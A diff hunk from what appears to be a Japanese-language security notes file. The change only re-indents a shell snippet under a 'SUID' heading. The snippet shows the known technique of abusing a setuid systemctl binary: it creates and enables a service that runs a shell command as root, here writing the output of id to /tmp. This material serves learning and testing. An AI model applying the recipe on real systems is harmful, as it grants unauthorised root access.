@@ -48,18 +48,18 @@
 
 * SUID
 
-``` shell
-    #install -mでモード指定
-    sudo install -m =xs $(which systemctl) .
-    #serviceの作成
-    TF=$(mktemp).service
-    echo '[Service]
-    Type=oneshot
-    ExecStart=/bin/sh -c "id > /tmp/output"
-    [Install]
-    WantedBy=multi-user.target' > $TF
-    #リンクの生成
-    ./systemctl link $TF
-    #サービスの有効化
-    ./systemctl enable --now $TF
-```
+    ``` shell
+        #install -mでモード指定
+        sudo install -m =xs $(which systemctl) .
+        #serviceの作成
+        TF=$(mktemp).service
+        echo '[Service]
+        Type=oneshot
+        ExecStart=/bin/sh -c "id > /tmp/output"
+        [Install]
+        WantedBy=multi-user.target' > $TF
+        #リンクの生成
+        ./systemctl link $TF
+        #サービスの有効化
+        ./systemctl enable --now $TF
+    ```
